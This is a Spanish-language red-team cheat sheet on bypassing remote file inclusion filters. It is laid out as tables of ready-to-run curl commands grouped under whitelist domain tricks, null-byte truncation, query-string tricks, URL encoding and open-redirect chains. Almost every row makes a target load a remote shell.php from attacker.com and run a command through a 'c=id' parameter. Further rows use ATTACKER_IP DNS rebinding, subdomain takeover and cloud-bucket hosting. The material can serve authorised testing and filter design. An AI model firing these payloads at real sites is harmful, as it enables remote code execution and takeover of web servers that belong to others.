---
aliases:
  - RFI Bypass
  - Whitelist Bypass RFI
  - Null Byte RFI
tags:
  - vuln/rfi
  - technique/defense-evasion
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Remote File Inclusion (RFI)]]"
---
# RFI - Bypass de Filtros

---

## Whitelist Domain Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://target.com.attacker.com/shell.php&c=id'` | Suffix attack bypass `endsWith` validation | Suffix endsWith filter. |
| `curl 'https://target/?page=http://attacker-target.com/shell.php&c=id'` | Composed domain substring bypass | Substring contains filter. |
| `curl 'https://target/?page=http://attacker.com/?inc=target.com/shell.php&c=id'` | Substring anywhere bypass | Contains anywhere filter. |
| `curl 'https://target/?page=http://target.com@attacker.com/shell.php&c=id'` | URL userinfo `@` separator parser confusion | Parser confusion. |
| `curl 'https://target/?page=http://attacker.com/#@target.com/shell.php&c=id'` | Fragment `#@` URL parser quirk | URL parser quirk. |
| `curl 'https://target/?page=http://attacker.com#.target.com/shell.php&c=id'` | Fragment with target suffix | Fragment trick. |
| `curl 'https://target/?page=http://target.com/redirect?url=http://attacker.com/shell.php&c=id'` | Open Redirect chain bypass whitelist | Redirect combo. |
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json` then claim sub + curl 'https://target/?page=http://claimed.target.com/shell.php' | Subdomain takeover host payload on `*.target.com` whitelist | SDT combo. |
| `curl --resolve target.com:80:ATTACKER_IP 'http://target.com/shell.php'` (DNS rebinding) | DNS rebinding TOCTOU resolve | DNS rebinding. |
| `python3 -c "import socket; socket.setdefaulttimeout(2); s = socket.create_connection(('target.com',80))"` (TOCTOU verify) | Verify DNS rebinding race | Rebinding probe. |
| `curl 'https://target/?page=https%3A%2F%2Fattacker.com%2Fshell.php&c=id'` | URL-encoded scheme bypass | Encoded bypass. |
| `curl 'https://target/?page=http://TARGET.COM.attacker.com/shell.php&c=id'` | Mixed case domain bypass | Case filter. |
| `curl 'https://target/?page=http://attacker.com\@target.com\@attacker.com/shell.php&c=id'` | Multiple `@` separator confusion | Multi-userinfo. |
| `curl 'https://target/?page=http://attacker.com.target.com.attacker.com/shell.php&c=id'` | Nested domain confusion | Nested filter. |
| `curl 'https://target/?page=http://attacker.com:80@target.com/shell.php&c=id'` | Port + userinfo confusion | Port + userinfo. |
^rfi-bypass-whitelist

---

## Null Byte Truncation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://attacker.com/shell.php%00&c=id'` | NUL byte truncate appended extension | Pre-PHP 5.3.4. |
| `curl 'https://target/?page=http://attacker.com/shell.php%00.html&c=id'` | NUL between payload and appended | Explicit truncate. |
| `curl 'https://target/?page=http://attacker.com/shell.php%2500&c=id'` | Double-encoded NUL `%2500` | Multi-decode. |
| `python3 -c "import requests; print(requests.get('https://target/?page=http://attacker.com/shell.php\x00.html&c=id').text)"` | Literal NUL byte via Python | Literal byte. |
| `curl --data-urlencode $'page=http://attacker.com/shell.php\x00' -G https://target/?c=id` | curl helper literal NUL | curl helper. |
| `curl 'https://target/?page=data://text/plain;base64,'$B64'%00&c=id'` | NUL byte combined data:// | Data combo. |
| `php -r "echo PHP_VERSION;"` (target if accessible) | Verify PHP version pre-attack | Pre-attack. |
| `curl 'https://target/?page=http://attacker.com/shell.php%00garbage&c=id'` | Garbage post-NUL ignored | Truncate test. |
| `curl 'https://target/?page=http://attacker.com/shell.txt%00.php&c=id'` | NUL between ext and append | Truncate to .txt. |
| `python3 -c "import urllib.parse; print(urllib.parse.quote(chr(0)))"` (generate %00) | DIY NUL encoder | DIY helper. |
^rfi-bypass-nullbyte

---

## Query String Trick (`?page=...?`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http://attacker.com/shell.php?&c=id'` | Trailing `?` → app's `.php` becomes query | Standard append bypass. |
| `curl 'https://target/?page=http://attacker.com/shell.php%3F&c=id'` | URL-encoded `?` | Encoded variant. |
| `curl 'https://target/?page=http://attacker.com/shell.php%23&c=id'` | URL-encoded `#` fragment | Fragment ignored. |
| `curl 'https://target/?page=http://attacker.com/shell.php?ignored=.php&c=id'` | Trailing query param soaks appended | Customize. |
| `curl 'https://target/?page=http://attacker.com/shell.php??&c=id'` | Multiple `?` edge | Edge parse. |
| `curl 'https://target/?page=http://attacker.com/shell.php?param=&c=id'` | Empty param soak | Empty soak. |
| `curl 'https://target/?page=http://attacker.com/shell.php?&app_appends_after=here&c=id'` | Hint via param naming | Workflow hint. |
| `curl 'https://target/?page=http://attacker.com/x?file=&c=id'` (sin extension + `?`) | No-ext + trailing `?` | Combined. |
| `curl 'https://target/?page=http://attacker.com/shell.php%3f%23&c=id'` | Encoded `?#` combo | Combined encoded. |
| `curl 'https://target/?page=http://attacker.com/shell.php%23%3F&c=id'` | Encoded `#?` reverse order | Edge order. |
^rfi-bypass-query

---

## URL Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=http%3A%2F%2Fattacker.com%2Fshell.php&c=id'` | Standard URL-encoded scheme | Bypass keyword filter. |
| `curl 'https://target/?page=http%253A%252F%252Fattacker.com%252Fshell.php&c=id'` | Double URL-encode | Multi-decode chain. |
| `curl 'https://target/?page=http%25253A%25252F%25252Fattacker.com%25252Fshell.php&c=id'` | Triple-encoded | Multi-layer decode. |
| `curl 'https://target/?page=%68%74%74%70://attacker.com/shell.php&c=id'` | Per-char encoded protocol | Per-char encode. |
| `curl 'https://target/?page=HTTP://attacker.com/shell.php&c=id'` | Uppercase scheme | Case bypass. |
| `curl 'https://target/?page=Http://attacker.com/shell.php&c=id'` | Mixed case scheme | Case mix. |
| `curl --data-urlencode 'page=ｈｔｔｐ://attacker.com/shell.php' -G 'https://target/?c=id'` | Full-width Unicode chars NFKC | Unicode normalize. |
| `curl 'https://target/?page=&#104;&#116;&#116;&#112;://attacker.com/shell.php&c=id'` | HTML decimal entities | HTML decode context. |
| `curl 'https://target/?page=&#x68;&#x74;&#x74;&#x70;://attacker.com/shell.php&c=id'` | HTML hex entities | HTML decode. |
| `python3 -c "import urllib.parse as u; print(u.quote(u.quote('http://attacker.com/shell.php',safe=''),safe=''))"` | DIY double encode | Generator. |
| `curl 'https://target/?page=http://xn--attacker-com/shell.php&c=id'` (punycode) | Punycode IDN | IDN visual. |
| `curl 'https://target/?page=http%3a//attacker.com/shell.php&c=id'` (mixed encoding `%3a` lowercase) | Partial mixed encoding | Mixed encode. |
^rfi-bypass-encoding

---

## Open Redirect Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?page=https://target.com/redirect?url=http://attacker.com/shell.php&c=id'` | Open Redirect via target.com whitelist bypass | Redirect chain. |
| `curl 'https://target/?page=https://target.com/out?redirect=http://attacker.com/shell.php&c=id'` | Common `out`/`redirect` param | Common endpoint. |
| `curl 'https://target/?page=https://target.com/logout?next=http://attacker.com/shell.php&c=id'` | Logout `next=` param | Logout redirect. |
| `curl 'https://target/?page=https://target.com/share?to=http://attacker.com/shell.php&c=id'` | Sharing endpoint redirect | Sharing combo. |
| `nuclei -t http/vulnerabilities/generic/open-redirect.yaml -u https://target` | Nuclei open redirect probe | Pre-attack discover. |
| `curl --resolve target.com:443:ATTACKER_IP 'https://target.com/shell.php?c=id'` (DNS rebinding) | DNS rebinding bypass whitelist | DNS rebinding. |
| `python3 -c "import socket; print(socket.gethostbyname_ex('target.com'))"` | Verify multiple A records | Round-robin DNS. |
| `curl 'https://target/?page=https://*.target.com/redirect?url=http://attacker.com/shell.php&c=id'` (post-SDT) | Subdomain takeover + redirect chain | SDT combo. |
| `curl 'https://target/?page=https://target-s3-bucket.s3.amazonaws.com/shell.php&c=id'` (target's S3 CNAME) | Cloud storage en target's domain | S3 CNAME. |
| `curl 'https://target/?page=https://target.com/proxy?url=http://attacker.com/shell.php&c=id'` | Proxy endpoint chain | Proxy endpoint. |
| `curl 'https://target/?page=https://target.com/api/preview?url=http://attacker.com/shell.php&c=id'` | URL preview API endpoint | Preview API. |
| `curl 'https://target/?page=https://login.target.com/oauth/authorize?redirect_uri=http://attacker.com/shell.php&c=id'` | OAuth redirect_uri leak chain | OAuth combo. |
^rfi-bypass-open-redirect

---
